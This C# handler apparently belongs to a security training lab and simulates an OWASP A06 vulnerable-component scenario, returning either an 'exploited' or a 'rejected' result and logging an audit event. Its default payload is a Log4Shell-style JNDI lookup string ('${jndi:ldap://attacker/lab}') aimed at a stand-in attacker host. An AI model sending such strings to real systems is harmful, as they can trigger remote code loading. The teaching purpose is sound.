using SecureOpsLab.Application.Common.CloudLogging;
using SecureOpsLab.Application.Common.Options;
using SecureOpsLab.Application.Common.Vulnerabilities;
using SecureOpsLab.Contracts.Vulnerabilities;

namespace SecureOpsLab.Application.Vulnerabilities.A06VulnerableComponents;

public sealed class RenderA06LegacyComponentQueryHandler
{
    private const string DefaultPayload = "${jndi:ldap://attacker/lab}";

    private readonly ILabCloudAuditLog _cloudAuditLog;
    private readonly VulnerabilityRuntimeState _vulnerabilityState;

    public RenderA06LegacyComponentQueryHandler(
        ILabCloudAuditLog cloudAuditLog,
        VulnerabilityRuntimeState vulnerabilityState)
    {
        _cloudAuditLog = cloudAuditLog;
        _vulnerabilityState = vulnerabilityState;
    }

    public async Task<A06LegacyComponentRenderResponse> Handle(
        RenderA06LegacyComponentQuery query,
        CancellationToken cancellationToken)
    {
        var occurredAtUtc = DateTime.UtcNow;
        var payload = string.IsNullOrWhiteSpace(query.Payload) ? DefaultPayload : query.Payload;
        var vulnerable = _vulnerabilityState.A06VulnerableComponents;
        var response = vulnerable
            ? BuildVulnerableResponse(query.CurrentUserId, payload, occurredAtUtc)
            : BuildSafeResponse(query.CurrentUserId, payload, occurredAtUtc);

        await WriteCloudEventAsync(
            response,
            vulnerable ? "VulnerableComponentExploit" : "LegacyComponentPayloadRejected",
            payload,
            cancellationToken);

        return response;
    }

    private async Task WriteCloudEventAsync(
        A06LegacyComponentRenderResponse response,
        string eventType,
        string targetId,
        CancellationToken cancellationToken)
    {
        await _cloudAuditLog.WriteAsync(new LabCloudAuditEvent
        {
            EventType = eventType,
            RuleId = response.Exploited ? "LAB-A06-COMPONENTS" : "LAB-A06-AUDIT",
            Severity = response.Exploited ? "High" : "Info",
            UserId = response.RequestedByUserId,
            TargetType = "LegacyComponentRender",
            TargetId = targetId,
            Result = response.Result,
            Details = response.Evidence,
            OccurredAtUtc = response.OccurredAtUtc
        }, cancellationToken);

        response.CloudEventWritten = true;
    }

    private static A06LegacyComponentRenderResponse BuildVulnerableResponse(
        Guid currentUserId,
        string payload,
        DateTime occurredAtUtc)
    {
        return new A06LegacyComponentRenderResponse
        {
            ScenarioId = VulnerabilityModuleIds.A06Components,
            OwaspCategory = "A06 Vulnerable and Outdated Components",
            VulnerableMode = true,
            Exploited = true,
            Blocked = false,
            CloudEventWritten = false,
            Result = "LegacyComponentAcceptedExploitMarker",
            Evidence = "The simulated legacy renderer accepted an exploit marker and exposed component metadata.",
            SafeControl = "Reject exploit markers and keep third-party components patched.",
            RequestedByUserId = currentUserId,
            OccurredAtUtc = occurredAtUtc,
            Artifacts = new Dictionary<string, string>
            {
                ["component"] = "LegacyReportRenderer 1.2.0",
                ["payload"] = payload
            }
        };
    }

    private static A06LegacyComponentRenderResponse BuildSafeResponse(
        Guid currentUserId,
        string payload,
        DateTime occurredAtUtc)
    {
        return new A06LegacyComponentRenderResponse
        {
            ScenarioId = VulnerabilityModuleIds.A06Components,
            OwaspCategory = "A06 Vulnerable and Outdated Components",
            VulnerableMode = false,
            Exploited = false,
            Blocked = true,
            CloudEventWritten = false,
            Result = "LegacyPayloadRejected",
            Evidence = "The component input was rejected before reaching the simulated legacy parser.",
            SafeControl = "Patched component rejects known exploit markers.",
            RequestedByUserId = currentUserId,
            OccurredAtUtc = occurredAtUtc,
            Artifacts = new Dictionary<string, string>
            {
                ["component"] = "ReportRenderer 2.0.0",
                ["payload"] = payload
            }
        };
    }
}
